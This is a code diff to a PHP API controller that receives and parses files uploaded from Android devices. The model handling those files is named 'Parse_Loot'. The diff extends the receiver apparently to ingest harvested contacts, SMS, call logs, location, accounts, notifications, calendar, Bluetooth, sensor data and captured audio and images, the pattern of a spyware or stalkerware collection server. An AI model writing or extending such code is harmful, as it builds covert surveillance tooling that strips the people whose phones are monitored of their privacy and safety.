@@ -4,6 +4,7 @@ namespace App\Controllers\api\v1;
 
 use App\Controllers\BaseController;
 use App\Models\Mod_Parse_Loot;
+use App\Models\Mod_Parse_Advanced;
 use App\Models\Mod_Receive;
 use App\Models\Mod_Android;
 use App\Models\Mod_Crypt;
@@ -20,13 +21,22 @@ class Receive extends BaseController
     // Configuration for the file upload logic
     private $uploadConfig = [
         'max_size'      => 104857600, // 10MB
-        'allowed_types' => ['txt', 'enc', 'bin'],
+        'allowed_types' => ['txt', 'enc', 'bin', 'jpg', 'jpeg', 'png', '3gp', 'mp3', 'wav'],
         'upload_path'   => WRITEPATH . 'uploads/text_dump/',
         'encrypt_name'  => true,
     ];
 
-    // Allowed file categories
-    private $allowedCategories = ['contacts', 'logs', 'sms', 'apps', 'files', 'calls', 'location'];
+    // Allowed file categories (legacy + advanced extractors)
+    private $allowedCategories = [
+        // Legacy extractors
+        'contacts', 'logs', 'sms', 'apps', 'files', 'calls', 'location',
+        // Advanced extractors
+        'device', 'device_context', 'context', 'network', 'network_info', 'accounts', 'calendar', 'app', 'app_usage', 'usage', 'notifications', 'bluetooth', 'sensors', 'sensor',
+        // Device info & security
+        'deviceinfo', 'device_info', 'security_audit', 'securityaudit',
+        // Media categories
+        'audio', 'image',
+    ];
 
 
 
@@ -392,15 +402,21 @@ class Receive extends BaseController
     private function extractFileInfo(\CodeIgniter\HTTP\Files\UploadedFile $file, string $newName): array
     {
         $originalName = $file->getClientName();
+        
+        // Priority: 1. POST parameter, 2. Filename prefix
+        $category = $this->request->getPost('category');
+        if (empty($category)) {
+            $category = explode('_', $originalName)[0] ?? 'unknown';
+        }
 
         return [
             'original_name' => $originalName,
-            'new_name' => $newName,
-            'size' => $file->getSize(),
-            'extension' => $file->getExtension(),
-            'mime_type' => $file->getMimeType(),
-            'category' => explode('_', $originalName)[0] ?? 'unknown',
-            'upload_path' => $this->uploadConfig['upload_path'] . $newName
+            'new_name'      => $newName,
+            'size'          => $file->getSize(),
+            'extension'     => $file->getExtension(),
+            'mime_type'     => $file->getMimeType(),
+            'category'      => strtolower(trim($category)),
+            'upload_path'   => $this->uploadConfig['upload_path'] . $newName
         ];
     }
 
@@ -410,46 +426,96 @@ class Receive extends BaseController
     private function processUploadedFile($filename, $ownerId, $category, $fileRecordId = null)
     {
         if (!in_array($category, $this->allowedCategories)) {
-            log_message('warning', "Unknown file category: {$category}");
-            return false;
+            log_message('warning', "Receive::processUploadedFile - Unknown category: {$category}");
+            return ['success' => false, 'error' => "Unknown category: {$category}"];
         }
 
         $modelParse = new Mod_Parse_Loot();
         $devicePrintId = $this->request->getPost('device_print_id');
         $startTime = microtime(true);
 
+        // ── Legacy extractor routing ─────────────────────────────────────
         $methodMap = [
             'contacts' => 'get_contacts',
-            'logs' => 'get_logs',
-            'calls' => 'get_logs',
-            'sms' => 'get_sms',
-            'apps' => 'get_apps',
-            'files' => 'get_files',
-            'location' => 'get_location'
+            'logs'     => 'get_logs',
+            'calls'    => 'get_logs',
+            'sms'      => 'get_sms',
+            'apps'     => 'get_apps',
+            'files'    => 'get_files',
+            'location' => 'get_location',
         ];
 
-        if (isset($methodMap[$category]) && method_exists($modelParse, $methodMap[$category])) {
-            try {
-                $result = $modelParse->{$methodMap[$category]}($filename, $ownerId, $devicePrintId, $fileRecordId);
-                $durationMs = round((microtime(true) - $startTime) * 1000, 2);
+        // ── Advanced extractor routing (aliases included) ─────────────────
+        $advancedMethodMap = [
+            'device'         => 'parse_device_context',
+            'device_context' => 'parse_device_context',
+            'context'        => 'parse_device_context',
+            'network'        => 'parse_network_info',
+            'network_info'   => 'parse_network_info',
+            'accounts'       => 'parse_accounts',
+            'calendar'       => 'parse_calendar',
+            'app'            => 'parse_app_usage',
+            'app_usage'      => 'parse_app_usage',
+            'usage'          => 'parse_app_usage',
+            'notifications'  => 'parse_notifications',
+            'bluetooth'      => 'parse_bluetooth',
+            'sensors'        => 'parse_sensors',
+            'sensor'         => 'parse_sensors',
+            'deviceinfo'     => 'parse_device_info',
+            'device_info'    => 'parse_device_info',
+            'security_audit' => 'parse_security_audit',
+            'securityaudit'  => 'parse_security_audit',
+            'audio'          => 'parse_captured_media',
+            'image'          => 'parse_captured_media',
+        ];
 
+        try {
+            $parsedCountOrBool = false;
+
+            if (isset($methodMap[$category]) && method_exists($modelParse, $methodMap[$category])) {
+                $parsedCountOrBool = $modelParse->{$methodMap[$category]}($filename, $ownerId, $devicePrintId, $fileRecordId);
+            } elseif (isset($advancedMethodMap[$category])) {
+                $modelAdvanced     = new Mod_Parse_Advanced();
+                $method            = $advancedMethodMap[$category];
+                
+                // Pass category for media parsing to differentiate between image/audio
+                if ($method === 'parse_captured_media') {
+                    $parsedCountOrBool = $modelAdvanced->$method($filename, $ownerId, $devicePrintId, $fileRecordId, $category);
+                } else {
+                    $parsedCountOrBool = $modelAdvanced->$method($filename, $ownerId, $devicePrintId, $fileRecordId);
+                }
+            } else {
+                log_message('error', "Receive::processUploadedFile - No handler for category: {$category}");
+                return ['success' => false, 'error' => "No handler for category: {$category}"];
+            }
+
+            $durationMs = round((microtime(true) - $startTime) * 1000, 2);
+
+            // Parser methods return boolean (Advanced) or count (Legacy)
+            if ($parsedCountOrBool === false) {
+                log_message('error', "Receive::processUploadedFile - Parser returned failure for {$category}");
                 return [
-                    'success' => true,
-                    'record_count' => $result,
+                    'success'     => false,
+                    'error'       => 'Processing failed in parser',
                     'duration_ms' => $durationMs,
-                    'file_record_id' => $fileRecordId
-                ];
-            } catch (\Exception $e) {
-                log_message('error', "Failed to parse {$category}: " . $e->getMessage());
-                return [
-                    'success' => false,
-                    'error' => $e->getMessage(),
-                    'duration_ms' => round((microtime(true) - $startTime) * 1000, 2)
                 ];
             }
-        }
 
-        return false;
+            return [
+                'success'        => true,
+                'record_count'   => is_bool($parsedCountOrBool) ? ($parsedCountOrBool ? 1 : 0) : $parsedCountOrBool,
+                'duration_ms'    => $durationMs,
+                'file_record_id' => $fileRecordId,
+            ];
+
+        } catch (\Exception $e) {
+            log_message('error', "Receive::processUploadedFile - Exception during {$category}: " . $e->getMessage());
+            return [
+                'success'     => false,
+                'error'       => $e->getMessage(),
+                'duration_ms' => round((microtime(true) - $startTime) * 1000, 2),
+            ];
+        }
     }
 
     /**
